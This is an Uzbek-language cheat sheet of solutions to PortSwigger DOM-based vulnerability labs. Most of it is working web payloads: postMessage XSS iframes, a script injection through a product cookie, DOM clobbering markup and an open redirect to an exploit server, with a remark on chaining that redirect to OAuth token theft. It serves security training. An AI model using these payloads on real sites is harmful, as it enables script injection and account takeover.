# DOM-based — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Bu papka = web messages (postMessage), cookie manipulation, DOM clobbering, open redirect.
> (DOM-based XSS sink lablari — document.write/innerHTML/jQuery/AngularJS — 02_XSS ichida.)

---

## Web messages (postMessage sink)

### DOM XSS via web message — PRACTITIONER
Sahifa `addEventListener('message')` bilan kelgan matnni `div#ads` ga qo'yadi (validatsiyasiz).
```html
<iframe src="https://example.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
```

### Web message + JavaScript URL — PRACTITIONER
`indexOf()` check "http:" ni qidiradi → `//http:` bilan aldaysan, `location.href` sink.
```html
<iframe src="https://example.com/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
> `javascript:print()` ishlaydi, `//http:` check'ni qondiradi, `//` qolganini komment qiladi.

### Web message + JSON.parse — PRACTITIONER
Xabar JSON parse qilinadi, `type:load-channel` iframe `src` ga tushadi.
```html
<iframe src=https://example.com/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

---

## Cookie manipulation

### DOM-based cookie manipulation — PRACTITIONER
`lastViewedProduct` cookie oxirgi product URL'ni saqlaydi → zaharli URL'ni cookie'ga yozib,
keyin bosh sahifaga redirect qilasan.
```html
<iframe src="https://example.com/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://example.com';window.x=1;"></iframe>
```

---

## DOM clobbering

### Clobbering attributes to bypass HTML filters — PRACTITIONER
Comment'ga clobbering HTML, keyin iframe `#x` bilan focus qo'zg'atadi.
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```
```html
<iframe src=https://example.com/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```
> Chrome only. `#x` → form focus → `onfocus=print()`.

### Exploiting DOM clobbering to enable XSS — PRACTITIONER
`defaultAvatar` o'zgaruvchisini clobber qilib `onerror` ni ishga tushirasan.
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
> 1-comment = clobbering HTML, 2-comment = istalgan matn → sahifa yuklanganda alert. Chrome only.

---

## Open redirection

### DOM-based open redirection — APPRENTICE
"Back to Blog" `url` paramni validatsiyasiz `location.href` ga qo'yadi.
```
https://example.com/post?postId=4&url=https://exploit.example.net/
```
> Victim exploit serverga redirect bo'ladi. Chain: open redirect → OAuth token o'g'irlash.

---

### Eslatma
Source → Sink zanjirini doim DevTools'da kuzat. Himoya: origin check (`e.origin`), sink'larga
to'g'ridan user input bermaslik. Umumiy: bu papka README.
